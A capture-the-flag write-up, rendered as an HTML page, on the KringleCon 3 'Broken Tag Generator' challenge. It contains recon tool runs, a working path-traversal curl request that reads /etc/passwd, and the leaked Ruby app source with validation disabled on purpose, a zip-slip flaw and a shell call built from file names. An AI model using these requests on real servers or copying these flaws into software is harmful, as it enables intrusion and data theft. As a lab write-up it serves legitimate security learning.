@@ -1,0 +1,1265 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
+    
+    
+      
+        <title>Objective 08 - [Write-up] Kringlecon 3: French Hens</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.15aa0b43.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.75751829.min.css">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#challenge-08-broken-tag-generator" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../.." title="[Write-up] Kringlecon 3: French Hens" class="md-header-nav__button md-logo" aria-label="[Write-up] Kringlecon 3: French Hens">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            [Write-up] Kringlecon 3: French Hens
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              Objective 08
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="[Write-up] Kringlecon 3: French Hens" class="md-nav__button md-logo" aria-label="[Write-up] Kringlecon 3: French Hens">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    [Write-up] Kringlecon 3: French Hens
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../.." class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../01-uncover-santas-gift-list/" class="md-nav__link">
+      Objective 01
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../02-investigate-s3-bucket/" class="md-nav__link">
+      Objective 02
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../03-point-of-sale-password-recovery/" class="md-nav__link">
+      Objective 03
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../04-operate-the-santavator/" class="md-nav__link">
+      Objective 04
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../05-open-hid-lock/" class="md-nav__link">
+      Objective 05
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../06-splunk-challenge/" class="md-nav__link">
+      Objective 06
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../07-can-d-bus-problem/" class="md-nav__link">
+      Objective 07
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Objective 08
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      Objective 08
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenge" class="md-nav__link">
+    Challenge
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-01" class="md-nav__link">
+    Step 01
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-02" class="md-nav__link">
+    Step 02
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-03" class="md-nav__link">
+    Step 03
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-04" class="md-nav__link">
+    Step 04
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-05" class="md-nav__link">
+    Step 05
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-06" class="md-nav__link">
+    Step 06
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-07" class="md-nav__link">
+    Step 07
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-08" class="md-nav__link">
+    Step 08
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-09" class="md-nav__link">
+    Step 09
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#weaponization" class="md-nav__link">
+    Weaponization
+  </a>
+  
+    <nav class="md-nav" aria-label="Weaponization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-10" class="md-nav__link">
+    Step 10
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#delivery" class="md-nav__link">
+    Delivery
+  </a>
+  
+    <nav class="md-nav" aria-label="Delivery">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-11" class="md-nav__link">
+    Step 11
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-12" class="md-nav__link">
+    Step 12
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../09-arp-shenanigans/" class="md-nav__link">
+      Objective 09
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../10-defeat-fingerprint-sensor/" class="md-nav__link">
+      Objective 10
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/33.6kbps/" class="md-nav__link">
+      Terminal/33.6kbps
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/can-bus-investigation/" class="md-nav__link">
+      Terminal/CAN Bus Investigations
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/debug-redis/" class="md-nav__link">
+      Terminal/Debug Redis
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/elf-code/" class="md-nav__link">
+      Terminal/Elf Code
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/kringle-kiosk/" class="md-nav__link">
+      Terminal/Kringle Kiosk
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/scapy-prepper/" class="md-nav__link">
+      Terminal/Scapy Prepper
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/snowball-fight/" class="md-nav__link">
+      Terminal/Snowball Fight
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/sort-o-matic/" class="md-nav__link">
+      Terminal/Sort-O-Matic
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/speaker-unprep/" class="md-nav__link">
+      Terminal/Speaker Unprep
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../terminal-challenges/unescape-tmux/" class="md-nav__link">
+      Terminal/Unescape Tmux
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenge" class="md-nav__link">
+    Challenge
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-01" class="md-nav__link">
+    Step 01
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-02" class="md-nav__link">
+    Step 02
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-03" class="md-nav__link">
+    Step 03
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-04" class="md-nav__link">
+    Step 04
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-05" class="md-nav__link">
+    Step 05
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-06" class="md-nav__link">
+    Step 06
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-07" class="md-nav__link">
+    Step 07
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-08" class="md-nav__link">
+    Step 08
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-09" class="md-nav__link">
+    Step 09
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#weaponization" class="md-nav__link">
+    Weaponization
+  </a>
+  
+    <nav class="md-nav" aria-label="Weaponization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-10" class="md-nav__link">
+    Step 10
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#delivery" class="md-nav__link">
+    Delivery
+  </a>
+  
+    <nav class="md-nav" aria-label="Delivery">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-11" class="md-nav__link">
+    Step 11
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-12" class="md-nav__link">
+    Step 12
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="challenge-08-broken-tag-generator">Challenge 08 -  Broken Tag Generator</h1>
+<h2 id="challenge">Challenge</h2>
+<pre><code>Difficulty: 4/5
+
+Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in
+the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for
+help with this.
+</code></pre>
+<p><img alt="screenshot of web app" src="media/interface.png" /></p>
+<h2 id="solution">Solution</h2>
+<h3 id="recon">Recon</h3>
+<h4 id="step-01">Step 01</h4>
+<p>Let's start with finding some info about
+<code>https://tag-generator.kringlecastle.com</code></p>
+<pre><code class="language-bash">root@kali:~/kringlecon20/challenges/08-broken-tag-generator# ping https://tag-generator.kringlecastle.com/
+ping: https://tag-generator.kringlecastle.com/: Name or service not known
+root@kali:~/kringlecon20/challenges/08-broken-tag-generator# dig @8.8.8.8 https://tag-generator.kringlecastle.com/
+
+; &lt;&lt;&gt;&gt; DiG 9.16.8-Debian &lt;&lt;&gt;&gt; @8.8.8.8 https://tag-generator.kringlecastle.com/
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 44841
+;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: dffe19b9049e3c2e5f6a443a5ffa54852a0e11faf92a208e (good)
+;; QUESTION SECTION:
+;https://tag-generator.kringlecastle.com/. IN A
+
+;; AUTHORITY SECTION:
+.                       600     IN      SOA     a.root-servers.net. nstld.verisign-grs.com. 2021010901 1800 900 604800 86400
+
+;; Query time: 16 msec
+;; SERVER: 8.8.8.8#53(8.8.8.8)
+;; WHEN: Sat Jan 09 20:12:37 EST 2021
+;; MSG SIZE  rcvd: 172
+
+root@kali:~/kringlecon20/challenges/08-broken-tag-generator# nmap 35.232.236.115:443 # received from browser
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 18:00 PST
+Failed to resolve &quot;35.232.236.115:443&quot;.
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.13 seconds
+root@kali:~/kringlecon20/challenges/08-broken-tag-generator#  
+</code></pre>
+<p><img alt="screenshot of shodan results" src="media/shodan.png" /></p>
+<h4 id="step-02">Step 02</h4>
+<p>It doesn't look like we can do much from the network end. Let's try finding
+the web app's directories. We can run DIRB against
+<code>https://tag-generator.kringlecastle.com/</code> and grab a coffee while we're waiting
+for the results.</p>
+<pre><code class="language-bash">root@kali:~/kringlecon20/challenges/08-broken-tag-generator# dirb https://tag-generator.kringlecastle.com/
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Jan  9 20:21:59 2021
+URL_BASE: https://tag-generator.kringlecastle.com/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: https://tag-generator.kringlecastle.com/ ----
++ https://tag-generator.kringlecastle.com/clear (CODE:302|SIZE:)
++ https://tag-generator.kringlecastle.com/image (CODE:501|SIZE:80)
++ https://tag-generator.kringlecastle.com/share (CODE:501|SIZE:80)
+
+-----------------
+END_TIME: Sat Jan  9 20:35:06 2021
+DOWNLOADED: 4612 - FOUND: 3
+root@kali:~/kringlecon20/challenges/08-broken-tag-generator# 
+</code></pre>
+<p><code>/clear</code> seems to be something we can explore.</p>
+<h4 id="step-03">Step 03</h4>
+<p>We can also run ZAP against <code>https://tag-generator.kringlecastle.com/</code> to
+find directories, files, and potential vulnerabilities/weaknesses.</p>
+<p><img alt="screenshot of ZAP results" src="media/zap.png" /></p>
+<p>It looks like there's a DOM-based XSS vulnerability that could also possibly be 
+a directory traversal vulnerability. Additionally, it seems like the web app 
+uses a vulnerable jquery version (v3.3.1). Additional endpoints that
+we may be interested in exploring are: <code>/images/</code> and <code>/js/app.js</code> </p>
+<h4 id="step-04">Step 04</h4>
+<p>We can manually explore what we've found. Let's first look at <code>/clear</code></p>
+<p><img alt="screenshot of clear results" src="media/clear.png" /></p>
+<p>Looks like <code>/clear</code> just redirects to <code>/</code>.</p>
+<h4 id="step-05">Step 05</h4>
+<p>Let's look at <code>/images</code></p>
+<p><img alt="screenshot of images results" src="media/images.png" /></p>
+<p>Looks like we're not able to access the <code>/images</code> directory directly, but are able to <code>GET</code> the files within that directory.</p>
+<p><img alt="screenshot of 19.png" src="media/19.png" /></p>
+<p>However, the <code>404</code> message shows that <code>/app/lib/app.rb</code> does all the routing. After trying to <code>GET</code> <code>https://tag-generator.kringlecastle.com/app/lib/app.rb</code> we receive the same 404.</p>
+<h4 id="step-06">Step 06</h4>
+<p>We're also given the non-broken app's URI. Looking at both the broken and non-broken source codes, we can find a <code>&lt;script src="js/app.js"&gt;&lt;/script&gt;</code> tag that links to the web apps' js, showing that the <code>/js/app</code> endpoint we fuzzed is loaded in the HTML. We can then download their respective javascript source and run diff to find the differences between the broken and non-broken web apps.</p>
+<pre><code class="language-bash">root@kali:~/kringlecon20/challenges/08-broken-tag-generator/code# diff -y broken-app.js unbroken-app.js | less
+</code></pre>
+<p><img alt="screenshot of diff results" src="media/diff.png" /></p>
+<p>There doesn't seem to be any exceptionally interesting differences besides that the broken app <code>console.log</code>s form and data info when using the <code>click</code> event for an input file. Therefore, we can use the console on the broken app to see what the form and data look like when we try to upload a file.</p>
+<h4 id="step-07">Step 07</h4>
+<p>Let's try uploading a file to see what happens in the console.</p>
+<p><img alt="screenshot of the upload results" src="media/upload.png" /></p>
+<p>So it looks like uploading a file returns a <code>POST</code> request to <code>/upload</code>. The interesting thing is, the <code>POST</code> request returns a <code>.png</code> id, which is then sent to a <code>GET</code> request for <code>/image?id=....png</code>. Therefore, since the app for some reason returns an ID just to look it up, it may be possible to find other files using <code>/image?id=</code></p>
+<h4 id="step-08">Step 08</h4>
+<p>Since we know (from the browser) that the web app is running on nginx/1.14.2 and thus is likely to be on a linux system, let's try <code>/image?id=../../../../etc/passwd</code></p>
+<pre><code class="language-bash">root@kali:~/kringlecon20/challenges/08-broken-tag-generator/code# curl https://tag-generator.kringlecastle.com/image\?id\=../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+app:x:1000:1000:,,,:/home/app:/bin/bash
+root@kali:~/kringlecon20/challenges/08-broken-tag-generator/code#
+</code></pre>
+<h4 id="step-09">Step 09</h4>
+<p>Since directory traversal works, let's try to get the one file that we know exists:</p>
+<pre><code class="language-bash">root@kali:~/kringlecon20/challenges/08-broken-tag-generator/code# curl https://tag-generator.kringlecastle.com/image\?id\=../../../../app/lib/app.rb
+# encoding: ASCII-8BIT
+
+TMP_FOLDER = '/tmp'
+FINAL_FOLDER = '/tmp'
+
+# Don't put the uploads in the application folder
+Dir.chdir TMP_FOLDER
+
+require 'rubygems'
+
+require 'json'
+require 'sinatra'
+require 'sinatra/base'
+require 'singlogger'
+require 'securerandom'
+
+require 'zip'
+require 'sinatra/cookies'
+require 'cgi'
+
+require 'digest/sha1'
+
+LOGGER = ::SingLogger.instance()
+
+MAX_SIZE = 1024**2*5 # 5mb
+
+# Manually escaping is annoying, but Sinatra is lightweight and doesn't have
+# stuff like this built in :(
+def h(html)
+  CGI.escapeHTML html
+end
+
+def handle_zip(filename)
+  LOGGER.debug(&quot;Processing #{ filename } as a zip&quot;)
+  out_files = []
+
+  Zip::File.open(filename) do |zip_file|
+    # Handle entries one by one
+    zip_file.each do |entry|
+      LOGGER.debug(&quot;Extracting #{entry.name}&quot;)
+
+      if entry.size &gt; MAX_SIZE
+        raise 'File too large when extracted'
+      end
+
+      if entry.name().end_with?('zip')
+        raise 'Nested zip files are not supported!'
+      end
+
+      # I wonder what this will do? --Jack
+      # if entry.name !~ /^[a-zA-Z0-9._-]+$/
+      #   raise 'Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen'
+      # end
+
+      # We want to extract into TMP_FOLDER
+      out_file = &quot;#{ TMP_FOLDER }/#{ entry.name }&quot;
+
+      # Extract to file or directory based on name in the archive
+      entry.extract(out_file) {
+        # If the file exists, simply overwrite
+        true
+      }
+
+      # Process it
+      out_files &lt;&lt; process_file(out_file)
+    end
+  end
+
+  return out_files
+end
+
+def handle_image(filename)
+  out_filename = &quot;#{ SecureRandom.uuid }#{File.extname(filename).downcase}&quot;
+  out_path = &quot;#{ FINAL_FOLDER }/#{ out_filename }&quot;
+
+  # Resize and compress in the background
+  Thread.new do
+    if !system(&quot;convert -resize 800x600\\&gt; -quality 75 '#{ filename }' '#{ out_path }'&quot;)
+      LOGGER.error(&quot;Something went wrong with file conversion: #{ filename }&quot;)
+    else
+      LOGGER.debug(&quot;File successfully converted: #{ filename }&quot;)
+    end
+  end
+
+  # Return just the filename - we can figure that out later
+  return out_filename
+end
+
+def process_file(filename)
+  out_files = []
+
+  if filename.downcase.end_with?('zip')
+    # Append the list returned by handle_zip
+    out_files += handle_zip(filename)
+  elsif filename.downcase.end_with?('jpg') || filename.downcase.end_with?('jpeg') || filename.downcase.end_with?('png')
+    # Append the name returned by handle_image
+    out_files &lt;&lt; handle_image(filename)
+  else
+    raise &quot;Unsupported file type: #{ filename }&quot;
+  end
+
+  return out_files
+end
+
+def process_files(files)
+  return files.map { |f| process_file(f) }.flatten()
+end
+
+module TagGenerator
+  class Server &lt; Sinatra::Base
+    helpers Sinatra::Cookies
+
+    def initialize(*args)
+      super(*args)
+    end
+
+    configure do
+      if(defined?(PARAMS))
+        set :port, PARAMS[:port]
+        set :bind, PARAMS[:host]
+      end
+
+      set :raise_errors, false
+      set :show_exceptions, false
+    end
+
+    error do
+      return 501, erb(:error, :locals =&gt; { message: &quot;Error in #{ __FILE__ }: #{ h(env['sinatra.error'].message) }&quot; })
+    end
+
+    not_found do
+      return 404, erb(:error, :locals =&gt; { message: &quot;Error in #{ __FILE__ }: Route not found&quot; })
+    end
+
+    get '/' do
+      erb(:index)
+    end
+
+    post '/upload' do
+      images = []
+      images += process_files(params['my_file'].map { |p| p['tempfile'].path })
+      images.sort!()
+      images.uniq!()
+
+      content_type :json
+      images.to_json
+    end
+
+    get '/clear' do
+      cookies.delete(:images)
+
+      redirect '/'
+    end
+
+    get '/image' do
+      if !params['id']
+        raise 'ID is missing!'
+      end
+
+      # Validation is boring! --Jack
+      # if params['id'] !~ /^[a-zA-Z0-9._-]+$/
+      #   return 400, 'Invalid id! id may contain letters, numbers, period, underscore, and hyphen'
+      # end
+
+      content_type 'image/jpeg'
+
+      filename = &quot;#{ FINAL_FOLDER }/#{ params['id'] }&quot;
+
+      if File.exists?(filename)
+        return File.read(filename)
+      else
+        return 404, &quot;Image not found!&quot;
+      end
+    end
+
+    get '/share' do
+      if !params['id']
+        raise 'ID is missing!'
+      end
+
+      filename = &quot;#{ FINAL_FOLDER }/#{ params['id'] }.png&quot;
+
+      if File.exists?(filename)
+        erb(:share, :locals =&gt; { id: params['id'] })
+      else
+        return 404, &quot;Image not found!&quot;
+      end
+    end
+
+    post '/save' do
+      payload = params
+      payload = JSON.parse(request.body.read)
+
+      data_url = payload['dataURL']
+      png = Base64.decode64(data_url['data:image/png;base64,'.length .. -1])
+
+      out_hash = Digest::SHA1.hexdigest png
+      out_filename = &quot;#{ out_hash }.png&quot;
+      out_path = &quot;#{ FINAL_FOLDER }/#{ out_filename }&quot;
+
+      LOGGER.debug(&quot;output: #{out_path}&quot;)
+      File.open(out_path, 'wb') { |f| f.write(png) }
+      { id: out_hash }.to_json
+    end
+  end
+end
+</code></pre>
+<h3 id="weaponization">Weaponization</h3>
+<h4 id="step-10">Step 10</h4>
+<p>Looks like if we upload a <code>.zip</code> (<code>handle_zip</code>), the web app will extract the <code>.zip</code> and save each <code>file</code> in the archive to <code>TMP_FOLDER/file</code>, where <code>TMP_FOLDER</code> is <code>/tmp</code>. Each file's name is unescaped, courtesy of Jack Frost. Each file is then sent to <code>process_file</code>. Sounds like a <a href="https://nakedsecurity.sophos.com/2018/06/06/the-zip-slip-vulnerability-what-you-need-to-know/">zipslip vulnerability</a>.</p>
